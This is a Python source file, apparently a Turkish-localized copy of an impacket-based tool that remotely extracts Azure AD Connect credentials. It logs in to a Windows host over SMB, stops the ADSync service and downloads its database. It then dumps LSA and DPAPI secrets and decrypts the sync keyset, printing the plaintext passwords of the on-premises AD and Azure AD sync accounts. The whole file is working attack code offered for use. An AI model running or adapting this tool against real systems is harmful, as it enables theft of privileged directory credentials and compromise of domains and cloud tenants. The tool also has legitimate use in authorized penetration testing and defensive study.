import argparse
import codecs
import logging
import os
import time
import sys
import ntpath
from binascii import unhexlify
from impacket import version
from impacket.uuid import string_to_bin, bin_to_string
from impacket.examples import logger
from impacket import smb3structs
from impacket.smbconnection import SMBConnection, SessionError
from impacket.dcerpc.v5 import transport, rrp, scmr, wkst, samr, epm, drsuapi
from impacket.examples.secretsdump import LocalOperations, RemoteOperations, SAMHashes, LSASecrets, NTDSHashes, OfflineRegistry, RemoteFile
from impacket.dpapi import MasterKeyFile, MasterKey, DPAPI_BLOB, CredentialFile, CREDENTIAL_BLOB
from impacket.winregistry import hexdump
from Cryptodome.Hash import HMAC, SHA1, MD4
from hashlib import pbkdf2_hmac
import subprocess
import xml.etree.ElementTree as ET
import base64
import hashlib
import binascii
import codecs
import sys
from Cryptodome import Random
from Cryptodome.Cipher import AES

def unpad(s):
    return s[:-ord(s[len(s)-1:])]

def deriveKeysFromUserkey(sid, pwdhash):
    if len(pwdhash) == 20:
        # SHA1
        key1 = HMAC.new(pwdhash, (sid + '\0').encode('utf-16le'), SHA1).digest()
        key2 = None
    else:
        # MD4 varsayilir
        key1 = HMAC.new(pwdhash, (sid + '\0').encode('utf-16le'), SHA1).digest()
        # Protected Users icin
        tmpKey = pbkdf2_hmac('sha256', pwdhash, sid.encode('utf-16le'), 10000)
        tmpKey2 = pbkdf2_hmac('sha256', tmpKey, sid.encode('utf-16le'), 1)[:16]
        key2 = HMAC.new(tmpKey2, (sid + '\0').encode('utf-16le'), SHA1).digest()[:20]

    return key1, key2

class RemoteFileRO(RemoteFile):
    '''
    Kapatildiginda dosyayi silmeyen RemoteFile sinifi
    '''
    def __init__(self, smbConnection, fileName, tree='ADMIN$'):
        RemoteFile.__init__(self, smbConnection, fileName)
        self._RemoteFile__tid = smbConnection.connectTree(tree)

    def close(self):
        if self._RemoteFile__fid is not None:
            self._RemoteFile__smbConnection.closeFile(self._RemoteFile__tid, self._RemoteFile__fid)
            self._RemoteFile__fid = None

class ADSRemoteOperations(RemoteOperations):
    def __init__(self, smbConnection, doKerberos, kdcHost=None, options=None):
        RemoteOperations.__init__(self, smbConnection, doKerberos, kdcHost)
        self.__smbConnection = smbConnection
        self.__serviceName = 'ADSync'
        self.__shouldStart = False
        self.__options = options

    def gatherAdSyncMdb(self):
        # Veritabaninin zaten indirildigi varsayilir
        if self.__options.existing_db:
            return
        self.__connectSvcCtl()
        try:
            self.__checkServiceStatus()
            logging.info('ADSync veritabani dosyalari indiriliyor')
            fileNames = []
            for files in self.__smbConnection.listPath('C$',r'Program Files\Microsoft Azure AD Sync\Data\*'):
                fileNames.append(files.get_longname())
            if "ADSync.mdf" in fileNames:
                with open('ADSync.mdf','wb') as fh:
                    self.__smbConnection.getFile('C$',r'Program Files\Microsoft Azure AD Sync\Data\ADSync.mdf', fh.write)
                with open('ADSync_log.LDF','wb') as fh:
                    self.__smbConnection.getFile('C$',r'Program Files\Microsoft Azure AD Sync\Data\ADSync_log.ldf', fh.write)
            else:
                with open('ADSync.mdf','wb') as fh:
                    self.__smbConnection.getFile('C$',r'Program Files\Microsoft Azure AD Sync\Data\ADSync2019\ADSync.mdf', fh.write)
                with open('ADSync_log.LDF','wb') as fh:
                    self.__smbConnection.getFile('C$',r'Program Files\Microsoft Azure AD Sync\Data\ADSync2019\ADSync_log.ldf', fh.write)
        finally:
            self.__restore_adsync()

    def gatherCredentialFiles(self, basepath):
        items = self.__smbConnection.listPath('C$', r'{0}\AppData\Local\Microsoft\Credentials\\*'.format(basepath))
        outvaults = []
        for item in items:
            if item.get_longname() == '.' or item.get_longname() == '..':
                continue
            outvaults.append(item.get_longname())
        return outvaults

    def findBasePath(self):
        basepaths = [
            r'Users\ADSync',
            r'Windows\ServiceProfiles\ADSync',
        ]
        outbasepath = None
        for basepath in basepaths:
            try:
                # Klasoru sorgula
                items = self.__smbConnection.listPath('C$', r'{0}\AppData\*'.format(basepath))
                # Klasor varsa dongudan cik
                outbasepath = basepath
                break
            except SessionError as err:
                if 'STATUS_OBJECT_PATH_NOT_FOUND' in str(err):
                    items = None
                    # Farkli bir basepath dene
                    continue
        if items is None:
            logging.error('ADSync profil dizini bulunamadi')
            return

        return outbasepath

    def processCredentialFile(self, file, userkey, basepath):
        tsid = None

        logging.info('%s kimlik bilgisi dosyasi sorgulaniyor', file)
        remoteFileName = RemoteFileRO(self.__smbConnection, r'{1}\AppData\Local\Microsoft\Credentials\{0}'.format(file, basepath), tree="C$")
        try:
            remoteFileName.open()
            data = remoteFileName.read(8000)
            cred = CredentialFile(data)
            # if logging.getLogger().level == logging.DEBUG:
                # cred.dump()
            blob = DPAPI_BLOB(cred['Data'])
        finally:
            remoteFileName.close()
        gmk = bin_to_string(blob['GuidMasterKey'])

        items = self.__smbConnection.listPath('C$', r'%s\AppData\Roaming\Microsoft\Protect\*' % basepath)

        for item in items:
            if item.get_longname().startswith('S-1-5-80'):
                tsid = item.get_longname()
                logging.info(r'NT SERVICE\ADSync Virtual Account icin SID bulundu: %s', tsid)

        if tsid is None:
            logging.error('ADSync kullanicisi icin SID belirlenemedi - masterkey aramasina devam edilemiyor')
            return

        key1, key2 = deriveKeysFromUserkey(tsid, userkey)
        remoteFileName = RemoteFileRO(self.__smbConnection, r'{2}\AppData\Roaming\Microsoft\Protect\{0}\{1}'.format(tsid, gmk, basepath), tree="C$")
        try:
            remoteFileName.open()
            data = remoteFileName.read(8000)
            mkf = MasterKeyFile(data)
            if logging.getLogger().level == logging.DEBUG:
                mkf.dump()
            data = data[len(mkf):]
            # Master key'i cikar
            if mkf['MasterKeyLen'] > 0:
                mk = MasterKey(data[:mkf['MasterKeyLen']])
                data = data[len(mk):]
            decryptedKey = mk.decrypt(key1)
            if not decryptedKey:
                decryptedKey = mk.decrypt(key2)
            if not decryptedKey:
                logging.error('Masterkey sifre cozme islemi SYSTEM UserKey + SID ile basarisiz oldu')
                return
            logging.info('ADSync kullanici masterkey degeri SYSTEM UserKey + SID ile cozuldu')
            data = CREDENTIAL_BLOB(blob.decrypt(decryptedKey))
            # if logging.getLogger().level == logging.DEBUG:
            #     data.dump()
            # print(data['Target'])
            if 'Microsoft_AzureADConnect_KeySet' in data['Target'].decode('utf-16le'):
                parts = data['Target'].decode('utf-16le')[:-1].split('_')
                return {
                    'instanceid': parts[3][1:-1].lower(),
                    'keyset_id': parts[4],
                    'data': data['Unknown3']
                }
            else:
                logging.info('%s iceren kimlik bilgisi bulundu, bir sonrakine geciliyor', data['Target'])
                return
        except SessionError as e:
            if 'STATUS_OBJECT_PATH_NOT_FOUND' in str(e):
                logging.error('%s GUID degerine sahip dosya icin masterkey bulunamadi', gmk)
            else:
                raise
        finally:
            remoteFileName.close()

    def decryptDpapiBlobSystemkey(self, item, key, entropy):
        cryptkey = None
        kb = DPAPI_BLOB(item)
        mk = bin_to_string(kb['GuidMasterKey'])
        logging.info('%s masterkey degeriyle DPAPI verisi cozuluyor', mk)
        # Burada RO sinifi kullanilir cunku normal sinif dosyayi cikista siler
        # DPAPI anahtarlarini silmek iyi bir fikir gibi gorunmuyor, bu yuzden bunu yapmamak en iyisi
        remoteFileName = RemoteFileRO(self.__smbConnection, 'SYSTEM32\\Microsoft\\Protect\\S-1-5-18\\%s' % mk)
        try:
            remoteFileName.open()
            data = remoteFileName.read(2000)
            mkf = MasterKeyFile(data)
            if logging.getLogger().level == logging.DEBUG:
                mkf.dump()
            data = data[len(mkf):]
            # Master key'i cikar
            if mkf['MasterKeyLen'] > 0:
                mk = MasterKey(data[:mkf['MasterKeyLen']])
                data = data[len(mk):]
            decryptedKey = mk.decrypt(key)
            try:
                decryptedkey = kb.decrypt(decryptedKey, entropy=entropy)
                cryptkey = decryptedkey
                if logging.getLogger().level == logging.DEBUG:
                    hexdump(decryptedkey)
            except Exception as ex:
                logging.error('%s anahtar seti (keyset) cozulemedi: %s', item, str(ex))
        finally:
            remoteFileName.close()
        return cryptkey

    def getMdbData(self, codec='utf-8'):

        out = {
            'cryptedrecords': [],
            'xmldata': []
        }
        keydata = None
        #
        if self.__options.from_file:
            logging.info('Yapilandirma verisi dosya sisteminden yukleniyor: %s', self.__options.from_file)
            infile = codecs.open(self.__options.from_file, 'r', codec)
            enumtarget = infile
        else:
            logging.info('Yapilandirma verisi icin veritabani sorgulaniyor')
            dbpath = os.path.join(os.getcwd(), r"ADSync.mdf")
            output = subprocess.Popen(["ADSyncQuery.exe", dbpath], stdout=subprocess.PIPE).communicate()[0]
            enumtarget = output.decode(codec).split('\n')
        for line in enumtarget:
            try:
                ltype, data = line.strip().split(': ')
            except ValueError:
                continue
            ltype = ltype.replace(u'﻿',u'')
            if ltype.lower() == 'record':
                xmldata, crypteddata = data.split(';')
                out['cryptedrecords'].append(crypteddata)
                out['xmldata'].append(xmldata)

            if ltype.lower() == 'config':
                instance, keyset_id, entropy = data.split(';')
                out['instance'] = instance
                out['keyset_id'] = keyset_id
                out['entropy'] = entropy
        if self.__options.from_file:
            infile.close()
        # Tum degerlerin outdata icinde olup olmadigini kontrol et
        required = ['cryptedrecords', 'xmldata', 'instance', 'keyset_id', 'entropy']
        for option in required:
            if not option in out:
                logging.error('Veritabanindan eksik veri var. %s secenegi cikarilamadi. Veritabaninizi veya cikti dosyanizi kontrol edin.', option)
                return None
        return out


    def saveADSYNC(self):
        logging.debug('AD Sync verisi kaydediliyor')
        return self._RemoteOperations__retrieveHive('SOFTWARE\\Microsoft\\Ad Sync')

    def __restore_adsync(self):
        # Once, servis baslangicta durdurulmussa tekrar baslat
        if self.__shouldStart is True:
            logging.info('%s servisi baslatiliyor' % self.__serviceName)
            scmr.hRStartServiceW(self.__scmr, self.__serviceHandle)

    def __connectSvcCtl(self):
        rpc = transport.DCERPCTransportFactory(self._RemoteOperations__stringBindingSvcCtl)
        rpc.set_smb_connection(self.__smbConnection)
        self.__scmr = rpc.get_dce_rpc()
        self.__scmr.connect()
        self.__scmr.bind(scmr.MSRPC_UUID_SCMR)

    def __checkServiceStatus(self):
        # SC Manager'i ac
        ans = scmr.hROpenSCManagerW(self.__scmr)
        self.__scManagerHandle = ans['lpScHandle']
        # Simdi servisi ac
        ans = scmr.hROpenServiceW(self.__scmr, self.__scManagerHandle, self.__serviceName)
        self.__serviceHandle = ans['lpServiceHandle']
        # Durumunu kontrol et
        ans = scmr.hRQueryServiceStatus(self.__scmr, self.__serviceHandle)
        if ans['lpServiceStatus']['dwCurrentState'] == scmr.SERVICE_STOPPED:
            logging.info('%s servisi durdurulmus durumda'% self.__serviceName)
            self.__shouldStart = False
            self.__stopped = True
            self.__shouldStop = False
        elif ans['lpServiceStatus']['dwCurrentState'] == scmr.SERVICE_RUNNING:
            logging.debug('%s servisi calisiyor'% self.__serviceName)
            self.__shouldStart = True
            self.__stopped  = False
            self.__shouldStop = True
        elif ans['lpServiceStatus']['dwCurrentState'] == scmr.SERVICE_STOP_PENDING:
            logging.debug('%s servisi hala duruyor'% self.__serviceName)
            self.__shouldStart = True
            self.__stopped  = False
            self.__shouldStop = False
        else:
            raise Exception('Bilinmeyen servis durumu 0x%x - Iptal ediliyor' % ans['lpServiceStatus']['dwCurrentState'])
        # Servis calisiyorsa gecici olarak durdur
        if self.__stopped is False:
            if self.__shouldStop:
                logging.info('%s servisi durduruluyor' % self.__serviceName)
                scmr.hRControlService(self.__scmr, self.__serviceHandle, scmr.SERVICE_CONTROL_STOP)
            i = 0
            time.sleep(3)
            # Durana kadar bekle
            while i < 60:
                ans = scmr.hRQueryServiceStatus(self.__scmr, self.__serviceHandle)
                if ans['lpServiceStatus']['dwCurrentState'] != scmr.SERVICE_STOPPED:
                    i+=1
                    time.sleep(1)
                else:
                    return
            raise Exception('Servis 60 saniye icinde durdurulamadi - Iptal ediliyor')



class ADSync(OfflineRegistry):
    def __init__(self, samFile, isRemote = False, perSecretCallback = lambda secret: _print_helper(secret)):
        OfflineRegistry.__init__(self, samFile, isRemote)
        self.__samFile = samFile
        self.__hashedBootKey = ''
        self.__itemsFound = {}
        self.__itemsWithKey = {}
        self.__perSecretCallback = perSecretCallback

    def dump(self):
        logging.info('dump icinde')
        for key in self.enumKey('Shared'):
            logging.info('Anahtar seti (keyset) ID bulundu: %s', key)
            value = self.getValue(ntpath.join('Shared',key,'default'))
            if value is not None:
                self.__itemsFound[key] = value[1]

    def process(self, remoteops, key, entropy):
        cryptkeys = []
        for index, item in self.__itemsFound.items():
            remoteops.decryptDpapiBlobSystemkey(item, key, entropy)
        return cryptkeys

class DumpSecrets:
    def __init__(self, remoteName, username='', password='', domain='', options=None):
        self.__remoteName = remoteName
        self.__remoteHost = options.target_ip
        self.__username = username
        self.__password = password
        self.__domain = domain
        self.__lmhash = ''
        self.__nthash = ''
        self.__aesKey = options.aesKey
        self.__smbConnection = None
        self.__remoteOps = None
        self.__SAMHashes = None
        self.__NTDSHashes = None
        self.__LSASecrets = None
        self.__adSyncHive = None
        self.__noLMHash = True
        self.__isRemote = True
        self.__outputFileName = options.outputfile
        self.__doKerberos = options.k
        self.__canProcessSAMLSA = True
        self.__kdcHost = options.dc_ip
        self.__options = options
        self.dpapiSystem = None

        if options.hashes is not None:
            self.__lmhash, self.__nthash = options.hashes.split(':')

    def connect(self):
        # Sadece hata ayiklama (debug) amacli
        # self.__smbConnection = SMBConnection(self.__remoteName, self.__remoteHost, preferredDialect=smb3structs.SMB2_DIALECT_21)
        self.__smbConnection = SMBConnection(self.__remoteName, self.__remoteHost)

        if self.__doKerberos:
            self.__smbConnection.kerberosLogin(self.__username, self.__password, self.__domain, self.__lmhash,
                                               self.__nthash, self.__aesKey, self.__kdcHost)
        else:
            self.__smbConnection.login(self.__username, self.__password, self.__domain, self.__lmhash, self.__nthash)

    @staticmethod
    def decrypt(record, keyblob):
        # print repr(keyblob)
        # print binascii.hexlify(keyblob[-44:])
        key1 = keyblob[-44:]
        # print binascii.hexlify(keyblob[-88:-44])
        key2 = keyblob[-88:-44]

        dcrypt = base64.b64decode(record)
        # hexdump(dcrypt)
        iv = dcrypt[8:24]
        # hexdump(iv)
        cryptdata = dcrypt[24:]

        cipher = AES.new(key2[12:], AES.MODE_CBC, iv)
        return unpad(cipher.decrypt(cryptdata)).decode('utf-16-le')

    # examples/dpapi.py dosyasindan alinmistir
    def getDPAPI_SYSTEM(self,secretType, secret):
        if secret.startswith("dpapi_machinekey:"):
            machineKey, userKey = secret.split('\n')
            machineKey = machineKey.split(':')[1]
            userKey = userKey.split(':')[1]
            self.dpapiSystem = {}
            self.dpapiSystem['MachineKey'] = unhexlify(machineKey[2:])
            self.dpapiSystem['UserKey'] = unhexlify(userKey[2:])
            logging.info('DPAPI machine key bulundu: %s', machineKey)

    def fetchMdb(self):
        self.__remoteOps.gatherAdSyncMdb()

    def getMdbData(self):
        try:
            return self.__remoteOps.getMdbData()
        except UnicodeDecodeError:
            return self.__remoteOps.getMdbData('utf-16-le')

    def dump(self):
        try:
            self.__isRemote = True
            bootKey = None
            try:
                try:
                    self.connect()
                except Exception as e:
                    if os.getenv('KRB5CCNAME') is not None and self.__doKerberos is True:
                        # SMBConnection basarisiz oldu. Bunun nedeni hedef sisteme
                        # oturum acmanin bir yolu olmamasi olabilir. Son care basvuruyoruz.
                        # Onbellekte (cache) biletlerin bulunmasini ve isimizi gormesini umuyoruz
                        logging.debug("SMBConnection basarili olmadi, Kerberos'un yardimci olmasini umuyoruz (%s)" % str(e))
                        pass
                    else:
                        raise

                self.__remoteOps  = ADSRemoteOperations(self.__smbConnection, self.__doKerberos, self.__kdcHost, self.__options)
                self.fetchMdb()
                mdbdata = self.getMdbData()
                if mdbdata is None:
                    logging.error('Gerekli veritabani bilgisi cikarilamadi. Cikiliyor')
                    return
                logging.info('Uzak kayit defterinden (registry) LSA sirlari sorgulaniyor')
                self.__remoteOps.enableRegistry()
                bootKey = self.__remoteOps.getBootKey()
            except Exception as e:
                self.__canProcessSAMLSA = False
                if str(e).find('STATUS_USER_SESSION_DELETED') and os.getenv('KRB5CCNAME') is not None \
                    and self.__doKerberos is True:
                    # SPN hedef adi dogrulamasi Off disinda bir seye ayarliysa ipucu veriyoruz
                    # Bu, cifs/ disindaki SPN'ler icin TGS kullanan SMB baglantilarinin kurulmasini engeller
                    logging.error('SPN hedef adi dogrulama ilkesi (policy) tam DRSUAPI dump islemini kisitliyor olabilir. -just-dc-user deneyin')
                else:
                    if logging.getLogger().level == logging.DEBUG:
                        import traceback
                        traceback.print_exc()
                    logging.error('RemoteOperations basarisiz oldu: %s', str(e))
                    return

            try:
                SECURITYFileName = self.__remoteOps.saveSECURITY()


                self.__LSASecrets = LSASecrets(SECURITYFileName, bootKey, self.__remoteOps,
                                               isRemote=self.__isRemote, history=False, perSecretCallback = self.getDPAPI_SYSTEM)
                self.__LSASecrets.dumpSecrets()
            except Exception as e:
                if logging.getLogger().level == logging.DEBUG:
                    import traceback
                    traceback.print_exc()
                logging.error('LSA hash cikarma islemi basarisiz oldu: %s', str(e))

            if not self.dpapiSystem:
                logging.error('LSA dump icinde DPAPI sirlari bulunamadi')
                return

            # Yeni format mi? Aksi belirtilmedikce bunu kullan
            if not self.__options.legacy:
                # Yeni format, kimlik bilgisi deposunda (credential store) saklanir
                logging.info('Yeni format anahtar seti (keyset) tespit edildi, sirlar kimlik bilgisi deposundan cikariliyor')
                basepath = self.__remoteOps.findBasePath()
                files = self.__remoteOps.gatherCredentialFiles(basepath)
                for credfile in files:
                    result = self.__remoteOps.processCredentialFile(credfile, self.dpapiSystem['UserKey'], basepath)
                    if result is not None:
                        if result['keyset_id'] != mdbdata['keyset_id'] or result['instanceid'] != mdbdata['instance']:
                            logging.warning('%s anahtar seti, %s ornek (instance) bulundu, ancak %s anahtar seti, %s ornek gerekiyor. Bir sonraki deneniyor',
                                result['keyset_id'], result['instanceid'], mdbdata['keyset_id'], mdbdata['instance'])
                        else:
                            logging.info('Veriyi cozmek icin dogru sifrelenmis anahtar seti bulundu')
                            break
                if result is None:
                    logging.error('Dogru anahtar seti (keyset) verisi bulunamadi')
                    return
                cryptkeys = [self.__remoteOps.decryptDpapiBlobSystemkey(result['data'], self.dpapiSystem['MachineKey'], string_to_bin(mdbdata['entropy']))]
            else:
                # Eski format: kayit defterinde (registry) saklanir
                try:
                    ADSYNCFileName = self.__remoteOps.saveADSYNC()
                    logging.info('AD Sync sifreleme anahtarlari kayit defterinden cikariliyor')
                    self.__AdSync = ADSync(ADSYNCFileName, isRemote=self.__isRemote)
                    self.__AdSync.dump()
                except Exception as e:
                    if logging.getLogger().level == logging.DEBUG:
                        import traceback
                        traceback.print_exc()
                    logging.error('Ad Sync cikarma islemi basarisiz oldu: %s', str(e))

                try:
                    cryptkeys = self.__AdSync.process(self.__remoteOps, self.dpapiSystem['MachineKey'], string_to_bin(mdbdata['entropy']))
                except Exception as e:
                    if logging.getLogger().level == logging.DEBUG:
                        import traceback
                        traceback.print_exc()
                    logging.error('DPAPI master key cikarma islemi basarisiz oldu: %s', str(e))

            try:
                logging.info('Sifrelenmis AD Sync yapilandirma verisi cozuluyor')
                for index, record in enumerate(mdbdata['cryptedrecords']):
                    # En yuksek cryptkey kaydiyla cozmeyi dene
                    drecord = DumpSecrets.decrypt(record, cryptkeys[-1]).replace('\x00','')

                    with open('r%d_xml_data.xml' % index, 'w') as outfile:
                        data = base64.b64decode(mdbdata['xmldata'][index]).decode('utf-16-le')
                        outfile.write(data)
                    with open('r%d_encrypted_data.xml' % index, 'w') as outfile:
                        outfile.write(drecord)
                    ctree = ET.fromstring(drecord)
                    dtree = ET.fromstring(data)
                    if 'forest-login-user' in data:
                        logging.info('Yerel AD kimlik bilgileri')
                        el = dtree.find(".//parameter[@name='forest-login-domain']")
                        if el is not None:
                            logging.info('\tDomain: %s', el.text)
                        el = dtree.find(".//parameter[@name='forest-login-user']")
                        if el is not None:
                            logging.info('\tKullanici adi: %s', el.text)
                    else:
                        # AAD yapilandirmasi varsayilir
                        logging.info('Azure AD kimlik bilgileri')
                        el = dtree.find(".//parameter[@name='UserName']")
                        if el is not None:
                            logging.info('\tKullanici adi: %s', el.text)
                    # Kucuk harfle veya buyuk P ile olabilir
                    fpw = None
                    el = ctree.find(".//attribute[@name='Password']")
                    if el is not None:
                        fpw = el.text
                    el = ctree.find(".//attribute[@name='password']")
                    if el is not None:
                        fpw = el.text
                    if fpw:
                        # fpw = fpw[:len(fpw)/2] + '...[REDACTED]'
                        logging.info('\tParola: %s', fpw)


            except Exception as e:
                #if logging.getLogger().level == logging.DEBUG:
                import traceback
                traceback.print_exc()
                logging.error('Kayit cozme islemi basarisiz oldu: %s', str(e))


        except (Exception, KeyboardInterrupt) as e:
            if logging.getLogger().level == logging.DEBUG:
                import traceback
                traceback.print_exc()
            logging.error(e)
        finally:
            try:
                self.cleanup()
            except:
                pass

    def cleanup(self):
        logging.info('Temizleniyor... ')
        if self.__remoteOps:
            self.__remoteOps.finish()
        if self.__LSASecrets:
            self.__LSASecrets.finish()
        if self.__AdSync:
            self.__AdSync.finish()



# Komut satiri argumanlarini isle.
if __name__ == '__main__':
    # Ornek loggerin temasini baslat
    logger.init()
    # stdout kodlama formatini acikca degistir
    if sys.stdout.encoding is None:
        # Cikti bir dosyaya yonlendirilmis
        sys.stdout = codecs.getwriter('utf8')(sys.stdout)

    print('Azure AD Connect uzaktan kimlik bilgisi cikarma araci - @_dirkjan tarafindan')

    parser = argparse.ArgumentParser(add_help = True, description = "Uzak makinede herhangi bir ajan calistirmadan "
                                                      "sirlari cikarmak icin cesitli teknikler uygular.")

    parser.add_argument('target', action='store', help='[[domain/]kullaniciadi[:parola]@]<hedef ad veya adres> veya LOCAL'
                                                       ' (yerel dosyalari ayristirmak istiyorsaniz)')
    parser.add_argument('-debug', action='store_true', help='DEBUG cikisini AC')
    parser.add_argument('--legacy', action='store_true', help='Eski anahtar seti (keyset) saklama konumunu kullan (registry)')
    parser.add_argument('--existing-db', action='store_true', help='MDB dosyasini indirme, gecerli dizinde zaten oldugunu varsay')
    parser.add_argument('--from-file', action='store', metavar="DOSYA",
                        help='Canli sorgu yapmak yerine, daha once olusturdugunuz bir ADSyncQuery ciktisini dosyadan oku')
    parser.add_argument('-outputfile', action='store',
                        help='temel cikti dosya adi. sam, secrets, cached ve ntds icin uzantilar eklenecektir')
    group = parser.add_argument_group('kimlik dogrulama')

    group.add_argument('-hashes', action="store", metavar = "LMHASH:NTHASH", help='NTLM hashleri, format LMHASH:NTHASH seklindedir')
    group.add_argument('-no-pass', action="store_true", help='parola sorma (-k ile kullanmak icin uygundur)')
    group.add_argument('-k', action="store_true", help='Kerberos kimlik dogrulamasi kullan. Hedef parametrelerine gore '
                             'ccache dosyasindan (KRB5CCNAME) kimlik bilgilerini alir. Gecerli kimlik bilgileri bulunamazsa, '
                             'komut satirinda belirtilenler kullanilir')
    group.add_argument('-aesKey', action="store", metavar = "hex anahtar", help='Kerberos Kimlik Dogrulamasi icin kullanilacak AES anahtari'
                                                                            ' (128 veya 256 bit)')
    group = parser.add_argument_group('baglanti')
    group.add_argument('-dc-ip', action='store',metavar = "ip adresi",  help='Domain controller IP adresi. '
                                 'Belirtilmezse hedef parametresinde belirtilen domain kismi (FQDN) kullanilir')
    group.add_argument('-target-ip', action='store', metavar="ip adresi",
                       help='Hedef makinenin IP adresi. Belirtilmezse hedef olarak ne verildiyse o kullanilir. '
                            'Hedef NetBIOS adiysa ve cozumleyemiyorsaniz kullanislidir')

    if len(sys.argv)==1:
        parser.print_help()
        sys.exit(1)

    options = parser.parse_args()

    if options.debug is True:
        logging.getLogger().setLevel(logging.DEBUG)
    else:
        logging.getLogger().setLevel(logging.INFO)

    import re

    domain, username, password, remoteName = re.compile('(?:(?:([^/@:]*)/)?([^@:]*)(?::([^@]*))?@)?(.*)').match(
        options.target).groups('')

    # Parola '@' iceriyorsa
    if '@' in remoteName:
        password = password + '@' + remoteName.rpartition('@')[0]
        remoteName = remoteName.rpartition('@')[2]

    if options.target_ip is None:
        options.target_ip = remoteName

    if domain is None:
        domain = ''

    if password == '' and username != '' and options.hashes is None and options.no_pass is False and options.aesKey is None:
        from getpass import getpass

        password = getpass("Parola:")

    if options.aesKey is not None:
        options.k = True

    dumper = DumpSecrets(remoteName, username, password, domain, options)
    try:
        dumper.dump()
    except Exception as e:
        if logging.getLogger().level == logging.DEBUG:
            import traceback
            traceback.print_exc()
        logging.error(e)
